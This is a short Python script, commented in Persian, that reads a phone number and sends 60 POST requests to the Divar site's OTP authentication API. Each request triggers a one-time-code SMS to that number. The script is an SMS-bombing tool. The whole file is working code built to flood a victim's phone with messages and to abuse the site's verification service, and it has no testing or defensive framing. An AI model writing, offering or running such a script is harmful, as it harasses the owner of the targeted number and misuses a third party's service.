import requests

# URL سایت دیوار و پارامتر ارسال OTP
site = {"name": "Divar", "url": "https://api.divar.ir/v5/auth/authenticate", "param": "phone"}

# گرفتن شماره تلفن از کاربر
phone_number = input("Please enter your phone number: ")

# ایجاد یک Session برای مدیریت بهتر درخواست‌ها
session = requests.Session()

# ارسال درخواست 60 بار به سایت دیوار
for i in range(60):
    try:
        # ارسال درخواست POST به سایت دیوار
        response = session.post(site["url"], json={site["param"]: phone_number})
        
        # بررسی وضعیت پاسخ
        if response.status_code == 200:
            print(f"✅ OTP sent to {site['name']} (Attempt {i+1}).")
        else:
            print(f"❌ Error sending OTP to {site['name']} (Attempt {i+1}). Status code: {response.status_code}")
    
    except Exception as e:
        # مدیریت خطاهای اتصال
        print(f"❌ Connection error to {site['name']} (Attempt {i+1}): {e}")